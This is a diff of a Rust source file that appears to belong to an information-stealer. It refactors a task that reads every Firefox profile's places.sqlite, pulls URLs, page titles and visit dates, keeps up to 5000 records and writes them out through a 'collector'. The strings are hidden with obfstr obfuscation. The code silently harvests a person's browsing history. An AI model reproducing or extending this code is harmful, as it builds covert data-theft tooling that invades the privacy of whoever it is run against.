@@ -1,12 +1,14 @@
 use crate::alloc::borrow::ToOwned;
 use crate::gecko::GeckoBrowserData;
-use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, History};
+use crate::{read_and_collect_unique_records, to_string_and_write_all, History, SqliteDatabase};
 use alloc::sync::Arc;
 use collector::{Browser, Collector};
 use database::TableRecord;
+use filesystem::path::Path;
+use filesystem::storage::StorageFileSystem;
+use filesystem::FileSystem;
 use obfstr::obfstr as s;
 use tasks::{parent_name, Task};
-use utils::path::Path;
 
 const MOZ_PLACES_URL: usize = 1;
 const MOZ_PLACES_TITLE: usize = 2;
@@ -22,12 +24,13 @@ impl<'a> HistoryTask<'a> {
     }
 }
 
-impl<C: Collector> Task<C> for HistoryTask<'_> {
+impl<C: Collector, F: FileSystem> Task<C, F> for HistoryTask<'_> {
     parent_name!("History");
     
-    unsafe fn run(&self, parent: &Path, collector: &C) {
-        let Some(mut history) = collect_and_read_sqlite_from_all_profiles(
+    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
+        let Some(mut history) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
             &self.browser.profiles,
+            &StorageFileSystem,
             |profile| profile / s!("places.sqlite"),
             s!("moz_places"),
             extract_history_from_record
@@ -39,11 +42,11 @@ impl<C: Collector> Task<C> for HistoryTask<'_> {
         history.truncate(5000);
         
         collector.get_browser().increase_history_by(history.len());
-        let _ = to_string_and_write_all(&history, "\n\n", parent);
+        let _ = to_string_and_write_all(&history, "\n\n", filesystem, parent);
     }
 }
 
-fn extract_history_from_record(record: &dyn TableRecord) -> Option<History> {
+fn extract_history_from_record<R: TableRecord>(record: &R) -> Option<History> {
     let url = record.get_value(MOZ_PLACES_URL)?.as_string()?.to_owned();
     let title = record.get_value(MOZ_PLACES_TITLE)?.as_string()?.to_owned();
     let last_visit_time = record.get_value(MOZ_PLACES_LAST_VISIT_DATE)?.as_integer()?.to_owned();
